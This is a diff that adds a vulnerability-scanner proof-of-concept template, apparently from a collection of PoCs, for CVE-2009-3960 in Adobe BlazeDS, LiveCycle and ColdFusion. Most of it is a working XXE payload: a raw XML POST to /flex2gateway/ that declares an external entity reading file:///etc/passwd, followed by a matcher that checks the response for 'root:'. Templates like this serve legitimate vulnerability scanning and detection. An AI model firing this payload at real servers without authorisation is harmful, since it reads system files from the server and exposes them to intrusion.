@@ -1,0 +1,36 @@
+[info]
+author = "AVE"
+description = "通过向 Adobe BlazeDS AMF 网关发送包含 XXE 的 XML 请求，利用 CVE-2009-3960 漏洞读取服务器任意文件。目标路径包括 /flex2gateway/、/messagebroker/http、/blazeds/messagebroker/http 等。响应中包含被读取文件内容即表示存在漏洞。"
+id = "POC-AVE-2009-0109"
+name = "Adobe BlazeDS/LiveCycle/ColdFusion XML外部实体注入 PoC"
+severity = "medium"
+tags = ["ave-2009-0109"]
+vuln_id = [
+    "CVE-2009-3960",
+    "AVE-2009-0109",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/flex2gateway/"
+protocol = "http"
+
+[poc.requests.body]
+content = '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [ <!ENTITY x3 SYSTEM "file:///etc/passwd"> ]><amfx ver="3" xmlns="http://www.macromedia.com/2005/amfx"><body><object><int>1</int></object><string>&x3;</string><int>5</int><int>0</int><int>0</int></object></body></amfx>'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "<?xml version",
+]
